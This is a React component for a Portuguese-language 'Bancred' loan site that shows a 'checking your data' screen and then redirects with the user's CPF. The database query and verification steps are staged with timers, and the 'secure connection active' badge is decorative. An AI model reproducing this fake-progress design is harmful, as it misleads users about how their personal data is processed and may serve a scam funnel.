import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { UserCheck, Check, Loader2 } from "lucide-react";
import logo from "@/assets/bancred-logo.png";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

type StepState = "pending" | "loading" | "done";

type StepProps = {
  label: string;
  state: StepState;
};

const Step = ({ label, state }: StepProps) => {
  const isDone = state === "done";
  const isLoading = state === "loading";
  const isPending = state === "pending";

  const bg = isDone ? "#ECFDF5" : isLoading ? "#FFFFFF" : "#F9FAFB";
  const border = isDone ? "#A7F3D0" : isLoading ? "#FFFFFF" : "#E5E7EB";
  const textColor = isDone ? "#047857" : isLoading ? "#1C68E3" : "#9CA3AF";
  const iconBg = isDone ? "#10B981" : isLoading ? "#1C68E3" : "#E5E7EB";
  const iconColor = isDone || isLoading ? "#FFFFFF" : "#9CA3AF";
  const dotColor = isDone ? "#10B981" : isLoading ? "#1C68E3" : "#D1D5DB";

  return (
    <div
      style={{
        background: bg,
        border: `1px solid ${border}`,
        borderRadius: 14,
        padding: "14px 16px",
        display: "flex",
        alignItems: "center",
        gap: 14,
        boxShadow: isLoading ? "0 6px 18px rgba(28,104,227,0.10)" : "none",
        transition: "background 0.4s ease, border-color 0.4s ease, box-shadow 0.4s ease",
        opacity: isPending ? 0.85 : 1,
      }}
    >
      <span
        style={{
          width: 36,
          height: 36,
          borderRadius: "50%",
          background: iconBg,
          color: iconColor,
          display: "inline-flex",
          alignItems: "center",
          justifyContent: "center",
          flexShrink: 0,
          transition: "background 0.4s ease",
        }}
      >
        {isDone ? (
          <Check width={18} height={18} strokeWidth={3} />
        ) : isLoading ? (
          <Loader2 width={18} height={18} style={{ animation: "bc-spin 0.9s linear infinite" }} />
        ) : (
          <Loader2 width={18} height={18} />
        )}
      </span>

      <div style={{ flex: 1, minWidth: 0 }}>
        <div
          style={{
            fontSize: 15,
            fontWeight: 700,
            color: textColor,
            display: "flex",
            alignItems: "center",
            gap: 8,
            transition: "color 0.4s ease",
          }}
        >
          <span>{label}</span>
          {isDone && <Check width={14} height={14} strokeWidth={3} />}
          {isLoading && <span style={{ color: "#1C68E3" }}>...</span>}
        </div>

        {isLoading && (
          <div
            style={{
              marginTop: 8,
              height: 4,
              borderRadius: 999,
              background: "#E0EAFB",
              overflow: "hidden",
            }}
          >
            <div
              style={{
                width: "40%",
                height: "100%",
                borderRadius: 999,
                background: "#1C68E3",
                animation: "bc-progress 1.4s ease-in-out infinite",
              }}
            />
          </div>
        )}
      </div>

      <span
        style={{
          width: 8,
          height: 8,
          borderRadius: "50%",
          background: dotColor,
          flexShrink: 0,
          transition: "background 0.4s ease",
        }}
      />
    </div>
  );
};

const Analise = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const [step1, setStep1] = useState<StepState>("loading");
  const [step2, setStep2] = useState<StepState>("pending");

  useEffect(() => {
    const t1 = window.setTimeout(() => {
      setStep1("done");
      setStep2("loading");
    }, 1800);

    const t2 = window.setTimeout(() => {
      setStep2("done");
    }, 3600);

    const t3 = window.setTimeout(() => {
      const cpf = searchParams.get("cpf") ?? "";
      navigate(`/pessoa${cpf ? `?cpf=${encodeURIComponent(cpf)}` : ""}`, { replace: true });
    }, 4200);

    return () => {
      window.clearTimeout(t1);
      window.clearTimeout(t2);
      window.clearTimeout(t3);
    };
  }, [navigate, searchParams]);

  return (
    <div
      style={{
        minHeight: "100dvh",
        display: "flex",
        flexDirection: "column",
        background: "#FFFFFF",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <style>{`
        @keyframes bc-spin { to { transform: rotate(360deg); } }
        @keyframes bc-progress {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(350%); }
        }
        @keyframes bc-pulse-ring {
          0% { transform: scale(0.95); opacity: 0.6; }
          70% { transform: scale(1.25); opacity: 0; }
          100% { transform: scale(1.25); opacity: 0; }
        }
      `}</style>

      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
          paddingTop: "calc(14px + env(safe-area-inset-top))",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 76, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main
        style={{
          flex: 1,
          background: "#F9FAFB",
          padding: "48px 16px",
          display: "flex",
          alignItems: "flex-start",
          justifyContent: "center",
        }}
      >
        <div style={{ width: "100%", maxWidth: 448 }}>
          <div
            style={{
              background: "linear-gradient(180deg, #EFF4FE 0%, #E6EEFD 100%)",
              border: "1px solid #DCE6FB",
              borderRadius: 18,
              padding: 24,
              boxShadow: "0 10px 30px -12px rgba(28,104,227,0.18)",
            }}
          >
            {/* Avatar */}
            <div style={{ textAlign: "center", marginBottom: 20 }}>
              <div
                style={{
                  position: "relative",
                  width: 72,
                  height: 72,
                  margin: "0 auto 14px",
                }}
              >
                <span
                  style={{
                    position: "absolute",
                    inset: 0,
                    borderRadius: "50%",
                    background: "#BFDBFE",
                    animation: "bc-pulse-ring 1.8s ease-out infinite",
                  }}
                />
                <div
                  style={{
                    position: "relative",
                    width: 72,
                    height: 72,
                    background: "#FFFFFF",
                    border: "2px solid #BFDBFE",
                    borderRadius: "50%",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <UserCheck width={34} height={34} color="#1C68E3" />
                </div>
              </div>
              <h1
                style={{
                  fontSize: 22,
                  fontWeight: 700,
                  color: "#0F172A",
                  letterSpacing: -0.4,
                  marginBottom: 6,
                }}
              >
                Analisando seus dados
              </h1>
              <p style={{ color: "#64748B", fontSize: 14 }}>Processando informações...</p>
            </div>

            {/* Steps */}
            <div style={{ display: "flex", flexDirection: "column", gap: 12, marginBottom: 18 }}>
              <Step label="Consultando banco de dados" state={step1} />
              <Step label="Finalizando verificação" state={step2} />
            </div>

            {/* Secure connection badge */}
            <div style={{ display: "flex", justifyContent: "center" }}>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 8,
                  background: "#FFFFFF",
                  border: "1px solid #E5E7EB",
                  borderRadius: 999,
                  padding: "6px 14px",
                  fontSize: 13,
                  fontWeight: 600,
                  color: "#111827",
                  boxShadow: "0 1px 2px rgba(17,24,39,0.04)",
                }}
              >
                <span
                  style={{
                    width: 8,
                    height: 8,
                    borderRadius: "50%",
                    background: "#10B981",
                    boxShadow: "0 0 0 3px rgba(16,185,129,0.18)",
                  }}
                />
                Conexão segura ativa
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer
        style={{
          background: "#111827",
          color: "#D1D5DB",
          padding: "32px 16px calc(32px + env(safe-area-inset-bottom))",
          borderTop: "1px solid #1F2937",
          textAlign: "center",
        }}
      >
        <div style={{ fontSize: 14, color: "#9CA3AF", marginBottom: 6 }}>
          © 2026 Bancred LTDA. Todos os direitos reservados.
        </div>
        <div style={{ fontSize: 14, color: "#6B7280", marginBottom: 6 }}>CNPJ 41.906.644/0001-20</div>
        <p style={{ fontSize: 12, color: "#6B7280" }}>
          Empréstimos rápidos e seguros para realizar seus sonhos
        </p>
      </footer>
    </div>
  );
};

export default Analise;
